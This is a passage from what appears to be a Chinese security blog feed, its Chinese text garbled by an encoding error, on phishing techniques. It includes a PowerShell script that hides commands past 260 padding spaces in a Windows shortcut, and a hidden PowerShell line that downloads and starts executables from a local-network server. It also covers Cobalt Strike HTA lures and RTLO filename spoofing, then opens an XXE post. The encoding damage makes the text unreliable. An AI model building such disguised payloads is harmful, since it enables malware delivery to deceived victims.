align="left">The shell link is saved with a <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/48f8a4c4-99fe-4787-a39f-b1367103eba8">DarwinDataBlock (section 2.5.3)</a>.</td></tr><tr><td align="left">N  <code>RunAsUser</code></td><td align="left">The application is run as a different user when the target of the shell link is activated.</td></tr><tr><td align="left">O<code>HasExpIcon</code></td><td align="left">The shell link is saved with an <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/9e6b7dfe-2ca2-4875-a0c9-8d75ee4f9b65">IconEnvironmentDataBlock (section 2.5.5)</a>.</td></tr><tr><td align="left">P  <code>NoPidlAlias</code></td><td align="left">The file system location is represented in the shell <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/ac7b5968-68f5-4e5c-8b11-00a6f4ae98ff#gt_165fda5c-ed85-42c2-bd8c-1bbbde70cee9">namespace</a> when the path to an item is parsed into an IDList.</td></tr><tr><td align="left">Q  <code>Unused2</code></td><td align="left">A bit that is undefined and MUST be ignored.</td></tr><tr><td align="left">R  <code>RunWithShimLayer</code></td><td align="left">The shell link is saved with a <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/bde812e5-5af0-4db9-a7e3-4a46e91c873a">ShimDataBlock (section 2.5.8)</a>.</td></tr><tr><td align="left">S  <code>ForceNoLinkTrack</code></td><td align="left">The <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/df8e3748-fba5-4524-968a-f72be06d71fc">TrackerDataBlock (section 2.5.10)</a> is ignored.</td></tr><tr><td align="left">T  <code>EnableTargetMetadata</code></td><td align="left">The shell link attempts to collect target properties and store them in the <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/36463387-0708-40f6-a3a5-452fe42be585">PropertyStoreDataBlock (section 2.5.7)</a> when the link target is set.</td></tr><tr><td align="left">U  <code>DisableLinkPathTracking</code></td><td align="left">The EnvironmentVariableDataBlock is ignored.</td></tr><tr><td align="left">V  <code>DisableKnownFolderTracking</code></td><td align="left">The <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/8833199d-fc03-4535-8011-ba36c4b3ad5f">SpecialFolderDataBlock (section 2.5.9)</a> and the <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/5c7410e4-ec19-4ec5-8fff-cf4ccc46c5b6">KnownFolderDataBlock (section 2.5.6)</a> are ignored when loading the shell link. If this bit is set, these extra data blocks SHOULD NOT be saved when saving the shell link.</td></tr><tr><td align="left">W  <code>DisableKnownFolderAlias</code></td><td align="left">If the <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/ac7b5968-68f5-4e5c-8b11-00a6f4ae98ff#gt_6cfb1417-9127-43fa-ad5b-1ddcc3d270a5">link</a> has a KnownFolderDataBlock (section 2.5.6), the unaliased form of the known folder IDList SHOULD be used when translating the target IDList at the time that the link is loaded.</td></tr><tr><td align="left">X  <code>AllowLinkToLink</code></td><td align="left">Creating a link that references another link is enabled. Otherwise, specifying a link as the target IDList SHOULD NOT be allowed.</td></tr><tr><td align="left">Y  <code>UnaliasOnSave</code></td><td align="left">When saving a link for which the target IDList is under a known folder, either the unaliased form of that known folder or the target IDList SHOULD be used.</td></tr><tr><td align="left">Z  <code>PreferEnvironmentPath</code></td><td align="left">The target IDList SHOULD NOT be stored; instead, the path specified in the EnvironmentVariableDataBlock (section 2.5.4) SHOULD be used to refer to the target.</td></tr><tr><td align="left">AA  <code>KeepLocalIDListForUNCTarget</code></td><td align="left">When the target is a <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/ac7b5968-68f5-4e5c-8b11-00a6f4ae98ff#gt_c9507dca-291d-4fd6-9cba-a9ee7da8c908">UNC</a> name that refers to a location on a local machine, the local path IDList in the PropertyStoreDataBlock (section 2.5.7) SHOULD be stored, so it can be used when the link is loaded on the local machine.</td></tr></tbody></table><p>å¯ä»¥åœ¨<strong>010 Editor</strong>ä¸­çœ‹åˆ°ï¼Œ1è¡¨ç¤ºè®¾ç½®çš„ï¼Œ0è¡¨ç¤ºæœªè®¾ç½®çš„</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/27.png" alt="image-20200813170527371"></p><h4 id="FileAttributes"><a href="#FileAttributes" class="headerlink" title="FileAttributes"></a>FileAttributes</h4><p>ç”±<code>offset 0x18</code>èµ·å§‹<code>4</code>å­—èŠ‚ä¸º<strong>FileAttributes</strong> <code> 0x00000020</code>è¡¨ç¤º<strong>FILE_ATTRIBUTE_ARCHIVE</strong></p><h4 id="CreateTime-amp-AccessTime-amp-WriteTime"><a href="#CreateTime-amp-AccessTime-amp-WriteTime" class="headerlink" title="CreateTime &amp; AccessTime &amp; WriteTime"></a>CreateTime &amp; AccessTime &amp; WriteTime</h4><p>ç”±<code>offset 0x1C</code>å¼€å§‹ï¼Œæ¯ä¸ªå­—æ®µå„å <code>8</code>å­—èŠ‚ï¼š</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/28.png" alt="image-20200813170742853"></p><h4 id="FileSize"><a href="#FileSize" class="headerlink" title="FileSize"></a>FileSize</h4><p>ç”±<code>offset 0x34</code>èµ·å§‹<strong>FileSize</strong>ä¸º<code>0x000C0B10</code>(å <code>4</code>ä¸ªå­—èŠ‚)</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/29.png" alt="image-20200813171033900"></p><h4 id="IconIndex"><a href="#IconIndex" class="headerlink" title="IconIndex"></a>IconIndex</h4><p><strong>IconIndex</strong>ä¸º<code>0x00000000</code>(å <code>4</code>ä¸ªå­—èŠ‚)ã€‚</p><h4 id="ShowCommand-amp-Hotkey"><a href="#ShowCommand-amp-Hotkey" class="headerlink" title="ShowCommand &amp; Hotkey"></a>ShowCommand &amp; Hotkey</h4><p>ç”±<code>offset 0x3C</code>å¼€å§‹ï¼Œ<strong>ShowCommand</strong>å <code>4</code>å­—èŠ‚ï¼Œ<strong>0x00000001</strong>è¡¨ç¤º<code>SW_SHOWNORMAL</code>,å½“ç„¶ä¹Ÿå¯ä»¥æ ¹æ®å…·ä½“çš„éœ€è¦æ›¿æ¢ä¸º<code>SW_SHOWMAXIMIZED (0x00000003)</code>(<strong>çª—å£æœ€å¤§åŒ–</strong>)ä»¥åŠ<code>SW_SHOWMINNOACTIVE (0x00000007)</code>(<strong>çª—å£æœ€å°åŒ–</strong>)</p><p><strong>Hotkey</strong>å <code>2</code>å­—èŠ‚ï¼›ä½™ä¸‹<code>10</code>ä¸ªå­—èŠ‚å‡ä¸ºä¿ç•™ä½ã€‚</p><h4 id="LinkTargetIDList"><a href="#LinkTargetIDList" class="headerlink" title="LinkTargetIDList"></a>LinkTargetIDList</h4><p>ç”±<code>offset 0x4C</code>å¼€å§‹ï¼Œä¸¤ä¸ªå­—èŠ‚è¡¨ç¤ºå¤§å°ï¼Œè¿™ä¸ªä½ç½®å°±æ˜¯ä¸€ä¸ªä¸€ä¸ªæ–‡ä»¶å¤¹æ‹¼æ¥èµ·æ¥çš„ä¸€ä¸ªå®Œæ•´è·¯å¾„ï¼Œè¿™è¾¹æµ‹è¯•çš„å®Œæ•´è·¯å¾„**â€C:\Program Files (x86)\Huorong\Sysdiag\bin\HipsMain.exeâ€**</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/30.png" alt="image-20200813172205813"></p><p>ç¬¬ä¸€ä¸ªItemIDä¸ºCLSID_MyComputer</p><p>ç¬¬äºŒä¸ªItemID,å…¶å«ä¹‰ä¸º<strong>c:</strong></p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/31.png" alt="image-20200813172621938"></p><p>ç¬¬ä¸‰ä¸ªItemID,ç¬¬äºŒå±‚çº§è·¯å¾„</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/32.png" alt="image-20200813172831624"></p><p>ç¬¬å››ä¸ªItemID-ç¬¬6ä¸ªItemID</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/33.png" alt="image-20200813173247917"></p><h4 id="LinkInfo"><a href="#LinkInfo" class="headerlink" title="LinkInfo"></a>LinkInfo</h4><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/34.png" alt="image-20200813173515708"></p><h4 id="String-Data"><a href="#String-Data" class="headerlink" title="String Data"></a>String Data</h4><p>StringData WORKING_DIRè¿™ä¸ªå­—æ®µæ˜¯èµ·å§‹ä½ç½®çš„å€¼</p><p>StringData ICON_LOCATIONè¿™ä¸ªå­—æ®µæ˜¯å›¾æ ‡ä½ç½®çš„å€¼</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/35.png" alt="image-20200813173754425"></p><h4 id="EXTRA-DATA"><a href="#EXTRA-DATA" class="headerlink" title="EXTRA_DATA"></a>EXTRA_DATA</h4><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/36.png" alt="EXTRA_DATA"></p><blockquote><p>è¿™è¾¹è®°ä¸ªå°TOP</p></blockquote><ul><li><p>ç›®æ ‡æ–‡ä»¶ä½ç½®æ‰€èƒ½æ˜¾ç¤ºæœ€å¤§å­—ç¬¦ä¸²ä¸º260ä¸ªï¼Œæ‰€æœ‰æˆ‘ä»¬å¯ä»¥æŠŠæ‰§è¡Œçš„å‘½ä»¤æ”¾åœ¨260ä¸ªå­—ç¬¦åé¢ï¼Œå…·ä½“ç”ŸæˆPSè„šæœ¬å¦‚ä¸‹</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="built_in">Get-Content</span> <span class="string">&quot;.\test.txt&quot;</span></span><br><span class="line"><span class="variable">$WshShell</span> = <span class="built_in">New-Object</span> <span class="literal">-comObject</span> WScript.Shell</span><br><span class="line"><span class="variable">$Shortcut</span> = <span class="variable">$WshShell</span>.CreateShortcut(<span class="string">&quot;test.lnk&quot;</span>)</span><br><span class="line"><span class="variable">$Shortcut</span>.TargetPath = <span class="string">&quot;%SystemRoot%\system32\cmd.exe&quot;</span></span><br><span class="line"><span class="variable">$Shortcut</span>.IconLocation = <span class="string">&quot;%SystemRoot%\System32\Shell32.dll,21&quot;</span></span><br><span class="line"><span class="variable">$Shortcut</span>.Arguments = <span class="string">&#x27;                                                                                                                                                                                                                                      &#x27;</span>+ <span class="variable">$file</span></span><br><span class="line"><span class="variable">$Shortcut</span>.Save()</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/37.png" alt="image-20200814175119204"></p></li><li><p>æˆ‘ä»¬å¯ä»¥åœ¨æ‰§è¡Œå®Œshellåå†ä»æœåŠ¡å™¨ä¸Šä¸‹è½½ä¸ªä¼ªè£…æ–‡ä»¶ï¼Œå¹¶ä¸”æ‰“å¼€ä»–ï¼Œç”¨æ¥è¿·æƒ‘ç›®æ ‡ï¼ˆæ¯”å¦‚ä½ åšçš„é’“é±¼æ–‡ä»¶æ˜¯PDFçš„é‚£ä½ å°±ä¸‹è½½ä¸ªPDFæ­£å¸¸çš„æ‰“å¼€ä»–ï¼‰ï¼Œè¿™è¾¹æµ‹è¯•ä¸‹è½½ä¸¤ä¸ªæ–‡ä»¶ï¼Œä¸€ä¸ªæ˜¯CMDä¸€ä¸ªpowershellï¼ˆä¸‹é¢çš„ä»£ç æ˜¯ä¸Šé¢æ‰€è¯´çš„test.txtä¸­çš„ä»£ç ï¼‰</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/c powershell <span class="literal">-nop</span> <span class="literal">-w</span> <span class="keyword">hidden</span> <span class="literal">-c</span> <span class="string">&quot;IEX ((new-object net.webclient).DownloadFile(&#x27;http://192.168.0.126:8000/cmd.exe&#x27;,&#x27;1.exe&#x27;))&quot;</span>;&amp;powershell <span class="literal">-nop</span> <span class="literal">-w</span> <span class="keyword">hidden</span> <span class="literal">-c</span> <span class="string">&quot;IEX ((new-object net.webclient).DownloadFile(&#x27;http://192.168.0.126:8000/powershell.exe&#x27;,&#x27;2.exe&#x27;))&quot;</span> ;&amp;powershell <span class="built_in">start-process</span> <span class="string">&#x27;.\1.exe&#x27;</span>;&amp;powershell <span class="built_in">start-process</span> <span class="string">&#x27;.\2.exe&#x27;</span></span><br></pre></td></tr></table></figure><p>æœ€ç»ˆæ•ˆæœå¦‚ä¸‹</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/38.gif" alt="2"></p></li></ul><h2 id="HTAé’“é±¼"><a href="#HTAé’“é±¼" class="headerlink" title="HTAé’“é±¼"></a>HTAé’“é±¼</h2><p>HTAæ˜¯HTML Applicationçš„ç¼©å†™ï¼Œç›´æ¥å°†HTMLä¿å­˜æˆHTAçš„æ ¼å¼ï¼Œæ˜¯ä¸€ä¸ªç‹¬ç«‹çš„åº”ç”¨è½¯ä»¶ã€‚<br>HTAè™½ç„¶ç”¨HTMLã€JSå’ŒCSSç¼–å†™ï¼Œå´æ¯”æ™®é€šç½‘é¡µæƒé™å¤§å¾—å¤šï¼Œå®ƒå…·æœ‰æ¡Œé¢ç¨‹åºçš„æ‰€æœ‰æƒé™ã€‚<br>å°±æ˜¯ä¸€ä¸ªhtmlåº”ç”¨ç¨‹åºï¼ŒåŒå‡»å°±èƒ½è¿è¡Œã€‚</p><p>Cobalt Strikeç”Ÿæˆæ–¹å¼ï¼šattacksâ€”â€”&gt;packagesâ€”â€”&gt;HTML application</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/19.png" alt="image-20200812182253747"></p><p>ç‚¹å‡»ç”ŸæˆåæŠŠ.htaæ–‡ä»¶å‘é€ç»™ç›®æ ‡ï¼Œç›®æ ‡è¿è¡Œåå°±å¯ä»¥çœ‹åˆ°æœºå™¨ä¸Šçº¿äº†</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/20.png" alt="image-20200812182638955"></p><h2 id="æ–‡ä»¶åç¼€RTLO"><a href="#æ–‡ä»¶åç¼€RTLO" class="headerlink" title="æ–‡ä»¶åç¼€RTLO"></a>æ–‡ä»¶åç¼€RTLO</h2><p>ä¼ªè£…æ–‡ä»¶ä¸­æœ‰ä¸ªæ¯”è¾ƒå¤è€çš„æ–¹å¼ï¼Œä½†ä¾ç„¶ä¼šåœ¨æ”»å‡»ä¸­çœ‹åˆ°å®ƒçš„èº«å½±ã€‚RTLOå­—ç¬¦å…¨åä¸ºâ€œRIGHT-TO-LEFT OVERRIDEâ€ï¼Œæ˜¯ä¸€ä¸ªä¸å¯æ˜¾ç¤ºçš„æ§åˆ¶ç±»å­—ç¬¦ï¼Œå…¶æœ¬è´¨æ˜¯unicode å­—ç¬¦ã€‚å¯ä»¥å°†ä»»æ„è¯­è¨€çš„æ–‡å­—å†…å®¹æŒ‰å€’åºæ’åˆ—ï¼Œæœ€åˆæ˜¯ç”¨æ¥æ”¯æŒä¸€äº›ä»å³å¾€å·¦å†™çš„è¯­è¨€çš„æ–‡å­—ï¼Œæ¯”å¦‚é˜¿æ‹‰ä¼¯è¯­ï¼Œå¸Œä¼¯æ¥è¯­ã€‚ç”±äºå®ƒå¯ä»¥é‡æ–°æ’åˆ—å­—ç¬¦çš„ç‰¹æ€§ï¼Œä¼šè¢«æ”»å‡»è€…åˆ©ç”¨ä»è€Œè¾¾åˆ°æ¬ºéª—ç›®æ ‡ï¼Œä½¿å¾—ç”¨æˆ·è¿è¡ŒæŸäº›å…·æœ‰å±å®³æ€§çš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚</p><h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>åˆ¶ä½œæ–¹å¼å°±æ˜¯è¿™æ ·çš„ï¼Œä»–ä¼šè®©å­—ç¬¦ä¸²å€’ç€ç¼–ç </p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/21.png" alt="image-20200813105304237"></p><h3 id="ç®€å•çš„ç”Ÿæˆ"><a href="#ç®€å•çš„ç”Ÿæˆ" class="headerlink" title="ç®€å•çš„ç”Ÿæˆ"></a>ç®€å•çš„ç”Ÿæˆ</h3><p>ç”¨Pythonä¸€é”®ç”Ÿæˆç”¨ï¼ŒæŠŠtxtæ”¹ä¸ºpngåç¼€</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.rename(<span class="string">&#x27;ascotbe.txt&#x27;</span>, <span class="string">&#x27;ascotbe-\u202egnp.txt&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/22.png" alt="image-20200813110156755"></p><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å§<strong>ascotbe.txt</strong>æ”¹æˆäº†<strong>ascotbe-txt.png</strong>å¹¶ä¸”è¿˜æ˜¯ä¸ªæ–‡æœ¬æ–‡æ¡£ç±»å‹</p><h3 id="ç”Ÿæˆé’“é±¼æ–‡ä»¶"><a href="#ç”Ÿæˆé’“é±¼æ–‡ä»¶" class="headerlink" title="ç”Ÿæˆé’“é±¼æ–‡ä»¶"></a>ç”Ÿæˆé’“é±¼æ–‡ä»¶</h3><p>å¦‚æœæ˜¯exeæ–‡ä»¶çš„è¯å¯ä»¥æ›¿æ¢å›¾æ ‡ï¼Œæ¥è¿›è¡Œè¿·æƒ‘è¡Œä¸ºï¼Œæˆ‘ä»¬å…ˆç”Ÿæˆä¸€ä¸ªé­…æƒ‘åå­—çš„æ–‡ä»¶</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/23.png" alt="image-20200813111611299"></p><p>è¿è¡Œpythonè„šæœ¬</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/24.png" alt="image-20200813111646139"></p><p>ç„¶åæˆ‘ä»¬ç”¨Resource Hackeræ›¿æ¢å›¾æ ‡</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/25.png" alt="image-20200813114403776"></p><h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;bhdresh&#x2F;CVE-2017-0199</span><br><span class="line">https:&#x2F;&#x2F;www.jianshu.com&#x2F;p&#x2F;850d1363abc5</span><br><span class="line">https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s?__biz&#x3D;MzAwMzYxNzc1OA&#x3D;&#x3D;&amp;mid&#x3D;2247485861&amp;idx&#x3D;1&amp;sn&#x3D;a4b87208c753c317240c7ae063871cdb&amp;chksm&#x3D;9b392f14ac4ea60240ca3c84f39f65a3b5584a08dbcf07b6962c3464ae282c3a1003fa3de37a&amp;scene&#x3D;126&amp;sessionid&#x3D;1596119031&amp;key&#x3D;25e1725a9070fca2a709c8a9cb837164ccd0b43058ae37339d865f113689c2ed541a337af3977dc16e95d85b32d7227c74f6df7e543f6d7634aced40e7cca665ce2895f15fe993763124fd2fa7c10091&amp;ascene&#x3D;1&amp;uin&#x3D;MTAzNzIzNDc2MQ%3D%3D&amp;devicetype&#x3D;Windows+10+x64&amp;version&#x3D;62090529&amp;lang&#x3D;zh_CN&amp;exportkey&#x3D;Aeo1t2sb2ZHnz3Nz8kzqLmw%3D&amp;pass_ticket&#x3D;DQWeM2sy7zmodhMi%2BT8fLsw34y3Tz9aBp44VMrGf14Nmcl7qS6hcq5YMCuQUdGSU</span><br><span class="line">http:&#x2F;&#x2F;zijieke.com&#x2F;d&#x2F;172</span><br><span class="line">https:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;openspecs&#x2F;windows_protocols&#x2F;ms-shllink&#x2F;c3376b21-0931-45e4-b2fc-a48ac0e60d15</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>XXEçš„ä¸€äº›åˆ©ç”¨æ–¹å¼</title>
    <link href="https://www.ascotbe.com/2020/07/24/XXE/"/>
    <id>https://www.ascotbe.com/2020/07/24/XXE/</id>
    <published>2020-07-24T13:45:42.000Z</published>
    <updated>2021-05-17T00:32:35.016Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>å£°æ˜</p></blockquote><p>éƒ‘é‡å£°æ˜ï¼šæ–‡ä¸­æ‰€æ¶‰åŠçš„æŠ€æœ¯ã€æ€è·¯å’Œå·¥å…·ä»…ä¾›ä»¥å®‰å…¨ä¸ºç›®çš„çš„å­¦ä¹ äº¤æµä½¿ç”¨ï¼Œä»»ä½•äººä¸å¾—å°†å…¶ç”¨äºéæ³•ç”¨é€”ä»¥åŠç›ˆåˆ©ç­‰ç›®çš„ï¼Œå¦åˆ™åæœè‡ªè¡Œæ‰¿æ‹…ï¼</p><blockquote><p>å‰è¨€</p></blockquote><p>å¯¹æ²¡é”™è¿™æ˜¯è¿™æ˜ŸæœŸçš„ç¬¬å››ç¯‡æ–‡ç« äº†ï¼Œæˆ‘æ„Ÿè§‰è¦è‚ä¸åŠ¨äº†å•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Š</p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/XXE/12.png" alt="image-20200729093326798" style="zoom:50%;" /><h3 id="XXEæ˜¯ä»€ä¹ˆ"><a href="#XXEæ˜¯ä»€ä¹ˆ" class="headerlink" title="XXEæ˜¯ä»€ä¹ˆ"></a>XXEæ˜¯ä»€ä¹ˆ</h3><p>XXE(XML External Entity Injection) å…¨ç§°ä¸º XML å¤–éƒ¨å®ä½“æ³¨å…¥ï¼Œä»åå­—å°±èƒ½çœ‹å‡ºæ¥ï¼Œè¿™æ˜¯ä¸€ä¸ªæ³¨å…¥æ¼æ´ï¼Œæ³¨å…¥çš„æ˜¯ä»€ä¹ˆï¼ŸXMLå¤–éƒ¨å®ä½“ã€‚(çœ‹åˆ°è¿™é‡Œè‚¯å®šæœ‰äººè¦è¯´ï¼šä½ è¿™ä¸æ˜¯åœ¨åºŸè¯)ï¼Œå›ºç„¶ï¼Œå…¶å®æˆ‘è¿™é‡ŒåºŸè¯åªæ˜¯æƒ³å¼ºè°ƒæˆ‘ä»¬çš„åˆ©ç”¨ç‚¹æ˜¯ <strong>å¤–éƒ¨å®ä½“</strong> ï¼Œä¹Ÿæ˜¯æé†’è¯»è€…å°†æ³¨æ„åŠ›é›†ä¸­äºå¤–éƒ¨å®ä½“ä¸­ï¼Œè€Œä¸è¦è¢« XML ä¸­å…¶ä»–çš„ä¸€äº›åå­—ç›¸ä¼¼çš„ä¸œè¥¿æ‰°ä¹±äº†æ€ç»´(<strong>ç›¯å¥½å¤–éƒ¨å®ä½“å°±è¡Œäº†</strong>)ï¼Œå¦‚æœèƒ½æ³¨å…¥ å¤–éƒ¨å®ä½“å¹¶ä¸”æˆåŠŸè§£æçš„è¯ï¼Œè¿™å°±ä¼šå¤§å¤§æ‹“å®½æˆ‘ä»¬ XML æ³¨å…¥çš„æ”»å‡»é¢ï¼ˆè¿™å¯èƒ½å°±æ˜¯ä¸ºä»€ä¹ˆå•ç‹¬è¯´ è€Œæ²¡æœ‰è¯´ XML æ³¨å…¥çš„åŸå› å§ï¼Œæˆ–è®¸æ™®é€šçš„ XML æ³¨å…¥çœŸçš„å¤ªé¸¡è‚‹äº†ï¼Œç°å®ä¸­å‡ ä¹ç”¨ä¸åˆ°ï¼‰</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/XXE/1.png" alt="img"></p><h3 id="åŸºç¡€çŸ¥è¯†"><a href="#åŸºç¡€çŸ¥è¯†" class="headerlink" title="åŸºç¡€çŸ¥è¯†"></a>åŸºç¡€çŸ¥è¯†</h3><p>XMLæ˜¯ä¸€ç§ç”¨äºæ ‡è®°ç”µå­æ–‡ä»¶ä½¿å…¶å…·æœ‰ç»“æ„æ€§çš„æ ‡è®°è¯­è¨€ï¼Œç”¨äºæ ‡è®°ç”µå­æ–‡ä»¶ä½¿å…¶å…·æœ‰ç»“æ„æ€§çš„æ ‡è®°è¯­è¨€ï¼Œå¯ä»¥ç”¨æ¥æ ‡è®°æ•°æ®ã€å®šä¹‰æ•°æ®ç±»å‹ï¼Œæ˜¯ä¸€ç§å…è®¸ç”¨æˆ·å¯¹è‡ªå·±çš„æ ‡è®°è¯­è¨€è¿›è¡Œå®šä¹‰çš„æºè¯­è¨€ã€‚XMLæ–‡æ¡£ç»“æ„åŒ…æ‹¬XMLå£°æ˜ã€DTDæ–‡æ¡£ç±»å‹å®šä¹‰ï¼ˆå¯é€‰ï¼‰ã€æ–‡æ¡£å…ƒç´ ã€‚</p><p>XML æ–‡æ¡£æœ‰è‡ªå·±çš„ä¸€ä¸ªæ ¼å¼è§„èŒƒï¼Œè¿™ä¸ªæ ¼å¼è§„èŒƒæ˜¯ç”±ä¸€ä¸ªå«åš DTDï¼ˆdocument type definitionï¼‰ çš„ä¸œè¥¿æ§åˆ¶çš„ï¼Œä»–å°±æ˜¯é•¿å¾—ä¸‹é¢è¿™ä¸ªæ ·å­</p><p><strong>ç¤ºä¾‹ä»£ç ï¼š</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&#x2F;&#x2F;è¿™ä¸€è¡Œæ˜¯ XML æ–‡æ¡£å®šä¹‰</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">&lt;!ELEMENT message (receiver ,sender ,header ,msg)&gt;</span><br><span class="line">&lt;!ELEMENT receiver (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT sender (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT header (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT msg (#PCDATA)&gt;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢è¿™ä¸ª DTD å°±å®šä¹‰äº† XML çš„æ ¹å…ƒç´ æ˜¯ messageï¼Œç„¶åè·Ÿå…ƒç´ ä¸‹é¢æœ‰ä¸€äº›å­å…ƒç´ ï¼Œé‚£ä¹ˆ XML åˆ°æ—¶å€™å¿…é¡»åƒä¸‹é¢è¿™ä¹ˆå†™</p><p><strong>ç¤ºä¾‹ä»£ç ï¼š</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;message&gt;</span><br><span class="line">&lt;receiver&gt;Myself&lt;&#x2F;receiver&gt;</span><br><span class="line">&lt;sender&gt;Someone&lt;&#x2F;sender&gt;</span><br><span class="line">&lt;header&gt;TheReminder&lt;&#x2F;header&gt;</span><br><span class="line">&lt;msg&gt;This is an amazing book&lt;&#x2F;msg&gt;</span><br><span class="line">&lt;&#x2F;message&gt;</span><br></pre></td></tr></table></figure><p>å…¶å®é™¤äº†åœ¨ DTD ä¸­å®šä¹‰å…ƒç´ ï¼ˆå…¶å®å°±æ˜¯å¯¹åº” XML ä¸­çš„æ ‡ç­¾ï¼‰ä»¥å¤–ï¼Œæˆ‘ä»¬è¿˜èƒ½åœ¨ DTD ä¸­å®šä¹‰å®ä½“(å¯¹åº”XML æ ‡ç­¾ä¸­çš„å†…å®¹)ï¼Œæ¯•ç«Ÿ ML ä¸­é™¤äº†èƒ½æ ‡ç­¾ä»¥å¤–ï¼Œè¿˜éœ€è¦æœ‰äº›å†…å®¹æ˜¯å›ºå®šçš„</p><p><strong>ç¤ºä¾‹ä»£ç ï¼š</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe &quot;test&quot; &gt;]&gt;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œ å®šä¹‰å…ƒç´ ä¸º ANY è¯´æ˜æ¥å—ä»»ä½•å…ƒç´ ï¼Œä½†æ˜¯å®šä¹‰äº†ä¸€ä¸ª xml çš„å®ä½“ï¼ˆè¿™æ˜¯æˆ‘ä»¬åœ¨è¿™ç¯‡æ–‡ç« 